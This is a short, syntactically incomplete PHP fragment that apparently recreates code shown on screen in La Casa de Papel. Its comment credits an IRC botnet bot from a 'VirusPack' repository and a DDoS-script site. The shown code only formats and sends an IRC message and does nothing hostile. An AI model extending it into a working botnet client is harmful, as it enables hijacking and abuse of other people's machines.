<?php
/*
  La Casa de Papel , s4e01 50:40
  
  Source code: 
    https://github.com/maestron/botnets/blob/master/VirusPack/Unix%20bot%202.2.5/Unix%20bot%202.2.5/team_unix_bot_2.2.5.txt
  But the cencored version that was used is from:
    http://hackingscripts.com/ddos-script/
*/

    $entry = $this->messages['entry'];
    $leetprefix = $this->config['leetprefix'];
    $leetsuffixred = $this->config['leetsuffixred'];
    $ip = ( $_SERVER["HTTP_HOST"] );
    $blue = $this->config['blue'];
    $red = $this->config['yellow'];
    $this->privmsg( $this->ffff_you( ), 
    "$leetprefix $entry $leetsuffixred" );
  }
  else
    $this->join($this->
